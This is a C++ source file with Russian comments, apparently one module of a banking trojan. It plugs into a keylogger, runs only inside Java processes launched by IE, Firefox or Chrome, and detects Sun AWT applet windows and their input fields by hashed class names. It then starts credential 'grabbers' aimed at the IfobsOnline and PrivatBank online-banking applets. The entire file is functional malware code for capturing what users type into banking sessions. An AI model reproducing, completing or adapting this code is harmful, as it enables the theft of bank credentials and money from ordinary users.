//---------------------------------------------------------------------------

#pragma hdrstop

#include "GetApi.h"
#include "JavaAppletGrabbers.h"
#include "Utils.h"

#include "Modules.h"
//---------------------------------------------------------------------------


void ActivateJavaAppletGrabber(HWND JafaFrameWnd, DWORD ClassWndHash, const char* URL, bool IsChildWindow);


//--------------------------------------------------------
//  Массив имён классов строк ввода в ява аплетах
//--------------------------------------------------------
const static DWORD JavaAppletEditClassNameHashes[] = {0xCB934F4 /* edit */,
													  0x7D5D13E5 /* richedit20w */,
													  0	};

const static PCHAR SunAvtCanvasWnd = "SunAwtCanvas";




// Окно аплета
HWND JavaAppletWnd = 0 ;



void WINAPI JavaAppletShowWndEvent(PKeyLogger Logger, DWORD EventID,
	LPVOID Data)
{
	PShowWindowData SW = (PShowWindowData)Data;

	if (SW->Command == SW_HIDE)
	{
		if (SW->Window == JavaAppletWnd)
        	JavaAppletWnd = 0;

		return;
    }

    if (JavaAppletWnd == SW->Window) return;

	// Массив окон на которые мы должны отреагировать
	const static DWORD KnownWindows[] = {JAVAWND_SUNAWTFRAME,
										 JAVAWND_SUNAWTDIALOG,
										 0};

	// Проверяем отображаемое окно
	bool IsKnownWindow = false;
	DWORD Hash = GetWndClassHash(SW->Window, true);

	for (int i = 0; KnownWindows[i] != 0; i++)
		if (KnownWindows[i] == Hash)
		{
			IsKnownWindow = true;
			break;
		}

	// Поймали нужное окно
	if (IsKnownWindow)
	{
		PCHAR URL = GetURLFromJavaProcess();

		JavaAppletWnd = SW->Window;
		bool IsChildWindow = pGetParent(SW->Window) != NULL;

		ActivateJavaAppletGrabber(JavaAppletWnd, Hash, URL, IsChildWindow);
	}
}



//-----------------------------------------------
//  Фугкция инициализирует систему граберов в
//  ява аплетах
//-----------------------------------------------
bool InitializeJavaAppletGrabbers()
{
	JavaAppletWnd = 0;


	PKeyLogger KLG = KeyLogger::GetKeyLogger();
	// Запускаемся только в процессе ява созданным из под процесса
	// Интернет Эксплорера
	if (!KLG || KLG->Process != PROCESS_JAVA)
		return false;     

	DWORD PID = GetParentPID();   
	DWORD Hash = GetHashForPid(PID);    
	// Пока проверяем принадлежность явы к процессам браузеров
	// по массиву хэшей
	const static DWORD Hashes[] = {PROCESS_HASH_IE,
								   PROCESS_HASH_FIREFOX,
								   PROCESS_HASH_CHROME,
								   0};

	bool ParentIsBrowser = false;
	for (int i = 0; Hashes[i] != 0; i++)
		if (Hashes[i] == Hash)
		{
			ParentIsBrowser = true;
			break;
		}

	if (ParentIsBrowser)
	{
		// Подключаемся к событию отображения окна
		KeyLogger::ConnectEventHandler(KLE_AFTER_SHOW_WND, JavaAppletShowWndEvent);
	}
	return ParentIsBrowser;
}



//-----------------------------------------------
//  IsJavaEditWindow - Функция возвращает истину
//                     окно является редактором
//                     ввода ява аплета
//-----------------------------------------------
bool IsJavaEditWindow(HWND Wnd)
{
	DWORD Hash = GetWndClassHash(Wnd, true);
	for (int i = 0; JavaAppletEditClassNameHashes[i] != 0; i++)
	{
		if (JavaAppletEditClassNameHashes[i] == Hash)
			return true;
    }
    return false;
}

//-----------------------------------------------
//  IsJavaLabelWindow - Функция возвращает истину
//                     окно является обычной
//                     надписью
//-----------------------------------------------
bool IsJavaLabelWindow(HWND Wnd)
{
	return GetWndClassHash(Wnd, true) == 0x22FB71B0 /* sunawtlabel */;
}




//-----------------------------------------------
//  GetSunAwtCanvasWnd - Функция возвращает окно
//                       SunAwtCanvas
//-----------------------------------------------
HWND GetSunAwtCanvasWnd(HWND SunAwtFrameWnd)
{
	return (HWND)pFindWindowExA(SunAwtFrameWnd, NULL, SunAvtCanvasWnd, NULL);
}







//============================================================================
void ActivateJavaAppletGrabber(HWND JafaFrameWnd, DWORD ClassWndHash, const char* URL, bool IsChildWindow)
{
	// Инициализируем IfobsOnline
	#ifdef IfobsOnlineH
		IfobsOnline::Initialize(JafaFrameWnd, ClassWndHash, URL, IsChildWindow);
	#endif


	#ifdef PrivatBankH
		PrivatBank::Initialize(JafaFrameWnd, ClassWndHash);
	#endif

}




